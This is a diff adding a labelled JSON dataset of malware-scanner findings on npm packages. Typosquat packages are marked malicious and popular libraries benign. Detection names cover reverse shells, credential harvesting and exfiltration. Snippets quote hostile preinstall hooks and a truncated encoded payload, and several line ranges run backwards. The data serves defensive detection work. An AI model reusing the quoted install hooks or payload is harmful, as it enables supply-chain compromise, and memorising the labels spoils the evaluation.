+    "file": "lib/forever.js",
+    "startLine": 476,
+    "endLine": 476,
+    "message": "OS fingerprinting data exfiltration detected. Source: process ... PROFILE \u2192 Sink: JSON.st ... ptions)"
+  },
+  {
+    "package": "logsymbles",
+    "version": "2.2.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./unknowably.js\"."
+  },
+  {
+    "package": "logsymbles",
+    "version": "2.2.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "unknowably.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "uglyfi-js",
+    "version": "3.4.6",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./lib/coprophagan.js\"."
+  },
+  {
+    "package": "uglyfi-js",
+    "version": "3.4.6",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "lib/coprophagan.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "stautses",
+    "version": "2.3.1",
+    "label": "malicious",
+    "query": "obfuscated-execution-risk",
+    "file": "index.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Obfuscated Execution Risk: Encoded data flows from `Buffer. ... 09,32])` to `Buffer. ... ilename"
+  },
+  {
+    "package": "stautses",
+    "version": "2.3.1",
+    "label": "malicious",
+    "query": "reverse-shell-obfuscated-exec",
+    "file": "index.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Malicious execution of data from $@.[101,99 ... 109,32]this source"
+  },
+  {
+    "package": "regenrator",
+    "version": "6.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./prebends.js\"."
+  },
+  {
+    "package": "regenrator",
+    "version": "6.0.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "prebends.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "jquerry",
+    "version": "2.0.0",
+    "label": "malicious",
+    "query": "reverse-shell-obfuscated-exec",
+    "file": "index.js",
+    "startLine": 5,
+    "endLine": 10,
+    "message": "Malicious execution of data from $@.\"cm0gLX ... wgJg==\"this source"
+  },
+  {
+    "package": "tensorplow",
+    "version": "1.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 21,
+    "message": "Potentially malicious install script in preinstall: \"sh build.sh &\"."
+  },
+  {
+    "package": "tensorplow",
+    "version": "1.0.1",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 21,
+    "message": "Potentially malicious install script in preinstall: \"sh build.sh &\"."
+  },
+  {
+    "package": "tensorplow",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 21,
+    "message": "Potentially malicious install script in preinstall: \"sh build.sh &\"."
+  },
+  {
+    "package": "loadyaml",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 16,
+    "message": "Potentially malicious install script in preinstall: \"node update.js &\"."
+  },
+  {
+    "package": "loadyaml",
+    "version": "1.0.2",
+    "label": "malicious",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "update.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.cpus() \u2192 Sink: b"
+  },
+  {
+    "package": "wafer-beacon",
+    "version": "1.3.3",
+    "label": "malicious",
+    "query": "computed-property-access",
+    "file": "mlbnzhz.js",
+    "startLine": "1",
+    "endLine": "1",
+    "message": "Potential obfuscated access to sensitive 'process' object.."
+  },
+  {
+    "package": "wafer-beacon",
+    "version": "1.3.3",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 11,
+    "message": "Potentially malicious install script in preinstall: \"node mlbnzhz.js\"."
+  },
+  {
+    "package": "wafer-beacon",
+    "version": "1.3.3",
+    "label": "malicious",
+    "query": "credential-harvest-exfil",
+    "file": null,
+    "startLine": null,
+    "endLine": null,
+    "message": null
+  },
+  {
+    "package": "wafer-beacon",
+    "version": "1.3.3",
+    "label": "malicious",
+    "query": "pre-post-source-sink-execution",
+    "file": "mlbnzhz.js",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Source path process ... 0x1cb)] flows into sensitive operation"
+  },
+  {
+    "package": "colro-name",
+    "version": "9.0.0",
+    "label": "malicious",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 1,
+    "message": "Potentially malicious install script in preinstall: \"node ./chlorella.js\"."
+  },
+  {
+    "package": "colro-name",
+    "version": "9.0.0",
+    "label": "malicious",
+    "query": "malicious-http-fs-exec",
+    "file": "chlorella.js",
+    "startLine": 25,
+    "endLine": 16,
+    "message": "Malicious pattern detected: HTTP request at line 25, chmod 0777 at line 16, and code execution at line 17"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 32,
+    "endLine": 32,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: sessionKey"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 66,
+    "endLine": 66,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: sessionKey"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 70,
+    "endLine": 80,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 92,
+    "endLine": 98,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/dispatcher/client.js",
+    "startLine": 179,
+    "endLine": 179,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: localAddress"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 32,
+    "endLine": 32,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: sessionKey"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 66,
+    "endLine": 66,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: sessionKey"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 70,
+    "endLine": 80,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 92,
+    "endLine": 98,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/dispatcher/client.js",
+    "startLine": 179,
+    "endLine": 179,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: localAddress"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 32,
+    "endLine": 32,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: sessionKey"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 66,
+    "endLine": 66,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: sessionKey"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 70,
+    "endLine": 80,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/core/connect.js",
+    "startLine": 92,
+    "endLine": 98,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "undici",
+    "version": "7.18.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/dispatcher/client.js",
+    "startLine": 179,
+    "endLine": 179,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: localAddress"
+  },
+  {
+    "package": "swc",
+    "version": "1.0.10",
+    "label": "benign",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 30,
+    "message": "Potentially malicious install script in install: \"node scripts/install.js || neon build --release\"."
+  },
+  {
+    "package": "swc",
+    "version": "1.0.9",
+    "label": "benign",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 30,
+    "message": "Potentially malicious install script in install: \"node scripts/install.js || neon build --release\"."
+  },
+  {
+    "package": "webpack",
+    "version": "5.103.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/DotenvPlugin.js",
+    "startLine": 423,
+    "endLine": 121,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "webpack",
+    "version": "5.104.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/DotenvPlugin.js",
+    "startLine": 424,
+    "endLine": 121,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "webpack",
+    "version": "5.104.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/DotenvPlugin.js",
+    "startLine": 424,
+    "endLine": 121,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "protobufjs",
+    "version": "8.1.5-experimental",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "scripts/postinstall.js",
+    "startLine": 31,
+    "endLine": 31,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... json\")) \u2192 Sink: pkg.nam ... ity.\\n\""
+  },
+  {
+    "package": "protobufjs",
+    "version": "8.1.4-experimental",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "scripts/postinstall.js",
+    "startLine": 31,
+    "endLine": 31,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... json\")) \u2192 Sink: pkg.nam ... ity.\\n\""
+  },
+  {
+    "package": "protobufjs",
+    "version": "8.1.6-experimental",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "scripts/postinstall.js",
+    "startLine": 31,
+    "endLine": 31,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... json\")) \u2192 Sink: pkg.nam ... ity.\\n\""
+  },
+  {
+    "package": "glob",
+    "version": "11.1.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/commonjs/processor.js",
+    "startLine": 39,
+    "endLine": 39,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "11.1.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/commonjs/processor.js",
+    "startLine": 62,
+    "endLine": 62,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "11.1.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/esm/processor.js",
+    "startLine": 35,
+    "endLine": 35,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "11.1.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/esm/processor.js",
+    "startLine": 57,
+    "endLine": 57,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "12.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/commonjs/processor.js",
+    "startLine": 39,
+    "endLine": 39,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "12.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/commonjs/processor.js",
+    "startLine": 62,
+    "endLine": 62,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "12.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/esm/processor.js",
+    "startLine": 35,
+    "endLine": 35,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "12.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/esm/processor.js",
+    "startLine": 57,
+    "endLine": 57,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "13.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/commonjs/processor.js",
+    "startLine": 39,
+    "endLine": 39,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "13.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/commonjs/processor.js",
+    "startLine": 62,
+    "endLine": 62,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "13.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/esm/processor.js",
+    "startLine": 35,
+    "endLine": 35,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "glob",
+    "version": "13.0.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "dist/esm/processor.js",
+    "startLine": 57,
+    "endLine": 57,
+    "message": "OS fingerprinting data exfiltration detected. Source: t.readdirSync() \u2192 Sink: target"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 49,
+    "message": "Potentially malicious install script in postinstall: \"node install.js\"."
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 31,
+    "endLine": 187,
+    "message": "Source path {\\n  \"wi ... -x64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 36,
+    "endLine": 187,
+    "message": "Source path {\\n  \"ai ... -x64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 58,
+    "endLine": 187,
+    "message": "Source path {\\n  \"an ... rm64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 69,
+    "endLine": 187,
+    "message": "Source path knownWi ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 72,
+    "endLine": 187,
+    "message": "Source path knownUn ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 75,
+    "endLine": 187,
+    "message": "Source path knownWe ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 81,
+    "endLine": 187,
+    "message": "Source path { pkg,  ... sWASM } flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 95,
+    "endLine": 187,
+    "message": "Source path require ... json\")) flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 179,
+    "endLine": 187,
+    "message": "Source path pkg flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 187,
+    "endLine": 187,
+    "message": "Source path @ flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 256,
+    "endLine": 187,
+    "message": "Source path { pkg, subpath } flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 271,
+    "endLine": 187,
+    "message": "Source path pkg flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 62,
+    "endLine": 62,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: encodeUTF8(value)"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 65,
+    "endLine": 65,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: value"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 1370,
+    "endLine": 1370,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: id"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 49,
+    "message": "Potentially malicious install script in postinstall: \"node install.js\"."
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 31,
+    "endLine": 187,
+    "message": "Source path {\\n  \"wi ... -x64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 36,
+    "endLine": 187,
+    "message": "Source path {\\n  \"ai ... -x64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 58,
+    "endLine": 187,
+    "message": "Source path {\\n  \"an ... rm64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 69,
+    "endLine": 187,
+    "message": "Source path knownWi ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 72,
+    "endLine": 187,
+    "message": "Source path knownUn ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 75,
+    "endLine": 187,
+    "message": "Source path knownWe ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 81,
+    "endLine": 187,
+    "message": "Source path { pkg,  ... sWASM } flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 95,
+    "endLine": 187,
+    "message": "Source path require ... json\")) flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 179,
+    "endLine": 187,
+    "message": "Source path pkg flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 187,
+    "endLine": 187,
+    "message": "Source path @ flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 256,
+    "endLine": 187,
+    "message": "Source path { pkg, subpath } flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 271,
+    "endLine": 187,
+    "message": "Source path pkg flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 62,
+    "endLine": 62,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: encodeUTF8(value)"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 65,
+    "endLine": 65,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: value"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 1370,
+    "endLine": 1370,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: id"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-install-scripts",
+    "file": "package.json",
+    "startLine": 1,
+    "endLine": 49,
+    "message": "Potentially malicious install script in postinstall: \"node install.js\"."
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 31,
+    "endLine": 187,
+    "message": "Source path {\\n  \"wi ... -x64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 36,
+    "endLine": 187,
+    "message": "Source path {\\n  \"ai ... -x64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 58,
+    "endLine": 187,
+    "message": "Source path {\\n  \"an ... rm64\"\\n} flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 69,
+    "endLine": 187,
+    "message": "Source path knownWi ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 72,
+    "endLine": 187,
+    "message": "Source path knownUn ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 75,
+    "endLine": 187,
+    "message": "Source path knownWe ... ormKey] flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 81,
+    "endLine": 187,
+    "message": "Source path { pkg,  ... sWASM } flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 95,
+    "endLine": 187,
+    "message": "Source path require ... json\")) flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 179,
+    "endLine": 187,
+    "message": "Source path pkg flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 187,
+    "endLine": 187,
+    "message": "Source path @ flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 256,
+    "endLine": 187,
+    "message": "Source path { pkg, subpath } flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "install.js",
+    "startLine": 271,
+    "endLine": 187,
+    "message": "Source path pkg flows into sensitive operation"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 62,
+    "endLine": 62,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: encodeUTF8(value)"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 65,
+    "endLine": 65,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: value"
+  },
+  {
+    "package": "esbuild",
+    "version": "0.27.2",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/main.js",
+    "startLine": 1370,
+    "endLine": 1370,
+    "message": "OS fingerprinting data exfiltration detected. Source: streamI ... \"utf8\") \u2192 Sink: id"
+  },
+  {
+    "package": "terser",
+    "version": "5.43.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/cli.js",
+    "startLine": 443,
+    "endLine": 443,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: msg"
+  },
+  {
+    "package": "terser",
+    "version": "5.43.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 2407,
+    "endLine": 2407,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: S.token"
+  },
+  {
+    "package": "terser",
+    "version": "5.43.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 2419,
+    "endLine": 2419,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: S.token"
+  },
+  {
+    "package": "terser",
+    "version": "5.43.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 3092,
+    "endLine": 3092,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: before_token"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.1",
+    "label": "benign",
